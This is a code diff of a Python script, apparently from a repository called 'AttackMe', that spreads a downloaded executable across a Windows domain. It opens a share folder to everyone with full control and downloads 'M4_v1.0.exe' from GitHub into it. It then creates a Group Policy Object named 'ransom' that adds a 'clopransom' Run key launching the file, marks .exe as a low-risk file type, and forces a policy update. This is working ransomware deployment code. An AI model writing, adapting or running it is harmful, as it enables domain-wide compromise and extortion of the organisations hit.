@@ -23,7 +23,7 @@ b = platform.node
 # 0.3 Username
 c = getpass.getuser()
 # 0.4 Download file
-d = "M4v1.0.exe"
+d = "M4_v1.0.exe"
 # 0.5 IP
 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 s.connect(("8.8.8.8", 80))
@@ -57,12 +57,9 @@ hostname = subprocess.check_output(['hostname']).decode(
 # 1. 공유 폴더 생성
 def file_create():
     try:
-        cmd1 = "powershell.exe mkdir C:\\users\\{}\\desktop\\share2".format(c)
-        cmd2 = "net share share2=C:\\users\\{}\\desktop\\share2 \"/GRANT:everyone,FULL\"".format(
-            c)
-        cmd3 = "icacls \"C:\\users\\{}\\desktop\\share2\" /t /grant \"everyone:(OI)(CI)F\"".format(
-            c)
-
+        cmd1 = "powershell.exe mkdir C:\\share2"
+        cmd2 = "net share share2=C:\\share2 \"/GRANT:everyone,FULL\""
+        cmd3 = "icacls \"C:\\share2\" /t /grant \"everyone:(OI)(CI)F\""
         subprocess.call(cmd1)
         subprocess.call(cmd2)
         subprocess.call(cmd3)
@@ -75,8 +72,8 @@ def file_create():
 # 2. Module4 다운로드
 def file_download():
     try:
-        url = "https://github.com/kdw9805/AttackMe/raw/main/M4v1.0.exe"
-        path = "C:/Users/{}/Desktop/share2/".format(c) + d
+        url = "https://github.com/kdw9805/AttackMe/blob/main/M4_v1.0.exe"
+        path = "C:/share2/M4_v1.0.exe"
 
         urllib.request.urlretrieve(url, path)
 
@@ -89,11 +86,9 @@ def file_download():
 def gpo_add():
     try:
         cmd1 = "powershell.exe new-gpo -name \"ransom\""
-        cmd2 = "powershell.exe Set-GPRegistryValue -Name \"ransom\" -Key \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -valuename clopransom -type string -value \"\\\{}\share2\{}\"".format(
-            e, d)
+        cmd2 = "powershell.exe Set-GPRegistryValue -Name \"ransom\" -Key \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -valuename clopransom -type string -value \"\\\{}\share2\{}\"".format(e, d)
         cmd3 = "powershell.exe set-gpregistryvalue -Name \"ransom\" -Key \"HKEY_CURRENT_USER\\Software\\Microsoft\Windows\\CurrentVersion\\policies\\associations\" -valuename LowRiskFileTypes -type string -value \".exe\""
-        cmd4 = "powershell.exe \"new-gplink -Name \\\"ransom\\\" -Target \\\"dc={},dc={}\\\"\"".format(
-            first, com)
+        cmd4 = "powershell.exe \"new-gplink -Name \\\"ransom\\\" -Target \\\"dc={},dc={}\\\"\"".format(first, com)
         cmd5 = "powershell.exe gpupdate /force"
 
         subprocess.call(cmd1)
@@ -144,11 +139,11 @@ def make_List(info_List):
 
 
 # 5. Main
-file = 'C:\\users\\{}\\desktop\\share2'.format(c)
+file = 'C:\\share2'.format(c)
 
 if os.path.isdir(file):
     print("file exist")
-    exit(1)
+    exit()
 
 else:
     print("no file")
